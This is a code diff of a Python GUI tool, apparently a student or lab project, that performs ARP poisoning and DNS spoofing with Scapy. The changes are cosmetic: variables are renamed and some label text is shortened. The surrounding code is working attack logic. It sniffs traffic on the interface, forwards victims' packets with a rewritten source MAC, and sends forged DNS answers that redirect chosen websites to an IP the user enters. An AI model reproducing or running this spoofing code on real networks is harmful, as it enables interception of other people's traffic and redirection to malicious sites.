@@ -16,18 +16,18 @@ class dnsfinal():
             widget.destroy()
         Label(self.root, text='Please enter the URLs of websites. For example, facebook.com ').pack()
         scroll = Scrollbar(self.root)
-        self.eula = Text(self.root, wrap=NONE, yscrollcommand=scroll.set)
-        scroll.config(command=self.eula.yview)
-        self.eula.pack()
+        self.show = Text(self.root, wrap=NONE, yscrollcommand=scroll.set)
+        scroll.config(command=self.show.yview)
+        self.show.pack()
         def get_multiple(self):
             self.full_list=[]
-            self.line_list = self.eula.get('1.0', 'end').split('\n')
+            self.line_list = self.show.get('1.0', 'end').split('\n')
             for self.line in self.line_list:
                 self.full_list.append(self.line)
             for self.line in self.full_list:
                 if self.line != '':
                     self.url.append(self.line)
-            self.ownMAC = get_if_hwaddr(self.interface)
+            self.myMAC = get_if_hwaddr(self.interface)
             self.startProcess()
         def restart_program(self):
             python =sys.executable
@@ -47,7 +47,7 @@ class dnsfinal():
                 self.multiple_url()
             else:
             #get own MAC address
-                self.ownMAC = get_if_hwaddr(self.interface)
+                self.myMAC = get_if_hwaddr(self.interface)
                 self.startProcess()
 
         def restart_program(self):
@@ -63,8 +63,7 @@ class dnsfinal():
     def website_ip(self):
         for widget in self.root.winfo_children():
             widget.destroy()
-        ipLabel = Label(self.root,
-                        text='Enter the ip address of the website to where the user should be redirected:').pack()
+        Label(self.root, text='Enter the ip address of the website to where the user should be redirected:').pack()
         ipValue = Entry(self.root)
         ipValue.pack()
 
@@ -119,7 +118,7 @@ class dnsfinal():
         for packet_sent, packet_received in self.ips_used:
             OPTIONS.append(packet_received[ARP].psrc)
 
-        select = Listbox(self.root, selectmode="single", width=100)
+        select = Listbox(self.root, selectmode="single", width=50)
         for each_item in range(len(OPTIONS)):
             select.insert(END, OPTIONS[each_item])
         select.pack()
@@ -140,7 +139,7 @@ class dnsfinal():
 
     def get_IP(self):
         ipLabel = Label(self.root,
-            text='Enter the range of IP addresses that you want to use (example: 192.168.5.85/24)').pack()
+            text='Enter the range of IPs (i.e.:10.0.2.0/24)').pack()
         ipValue = Entry(self.root)
         ipValue.pack()
         
@@ -165,7 +164,7 @@ class dnsfinal():
 
     def startProcess(self):
         arpprocess = dnsarp(self.interface)
-        arpprocess.setInput(self.ip_range, self.ips_used, self.defaultGateway, self.target, self.ownMAC, "y", "loud")
+        arpprocess.setInput(self.ip_range, self.ips_used, self.defaultGateway, self.target, self.myMAC, "y", "loud")
         proc_thread = None
         proc_thread = threading.Thread(target=arpprocess.startProcess)
         proc_thread.daemon = True
@@ -179,12 +178,12 @@ class dnsfinal():
             os.execl(python, python, * sys.argv)
         self.re = Button(self.root, text="Reset", command=lambda:restart_program(self))
         self.re.pack(side=BOTTOM)
-        self.eula = Text(self.root, wrap=NONE, yscrollcommand=scroll.set)
-        scroll.config(command=self.eula.yview)
-        self.eula.pack()
-        self.eula.insert(END, "DNS sniffing has started" + '\n')
-        self.eula.see(END)
-        self.eula.update_idletasks()
+        self.show = Text(self.root, wrap=NONE, yscrollcommand=scroll.set)
+        scroll.config(command=self.show.yview)
+        self.show.pack()
+        self.show.insert(END, "DNS sniffing has started" + '\n')
+        self.show.see(END)
+        self.show.update_idletasks()
         while True:
             sniff(store=0, prn=lambda packet: self.doSpoofing(packet), iface=self.interface)
 
@@ -202,7 +201,7 @@ class dnsfinal():
                         for tar1 in self.target:
                             if(tar1["ip"] == packet[IP].dst):
                                 receiver = tar1
-                                packet[Ether].src = self.ownMAC
+                                packet[Ether].src = self.myMAC
                                 packet[Ether].dst = receiver["mac"]
                                 sendp(packet, iface=self.interface, verbose=False)
                     #Case where packet does not come from gateway
@@ -227,12 +226,12 @@ class dnsfinal():
                                     spoofedDNS = DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=spoofedDNSRR)
                                     #send the packet
                                     sendp(spoofedETHER/spoofedIP/spoofedUDP/spoofedDNS, iface=self.interface, verbose=False)
-                                    self.eula.insert(END, "we spoofed IP: {}, Query: {}, response: {}".format(packet[IP].src, packet[DNS].qd.qname, self.ip_website) + '\n')
-                                    self.eula.see(END)
-                                    self.eula.update_idletasks()
+                                    self.show.insert(END, "we spoofed IP: {}, Query: {}, response: {}".format(packet[IP].src, packet[DNS].qd.qname, self.ip_website) + '\n')
+                                    self.show.see(END)
+                                    self.show.update_idletasks()
                                 #Packet was not supposed to be spoofed
                                 else:
-                                    packet[Ether].src = self.ownMAC
+                                    packet[Ether].src = self.myMAC
                                     packet[Ether].dst = self.defaultGateway[0]["mac"]
                                     sendp(packet, iface=self.interface, verbose=False)                        
                 else:
@@ -245,7 +244,7 @@ class dnsfinal():
                     else:
                         for tar in self.target:
                             if tar["mac"] == packet[Ether].src:
-                                packet[Ether].src = self.ownMAC
+                                packet[Ether].src = self.myMAC
                                 packet[Ether].dst = self.defaultGateway[0]["mac"]
                                 sendp(packet, iface=self.interface, verbose=False)
             except:
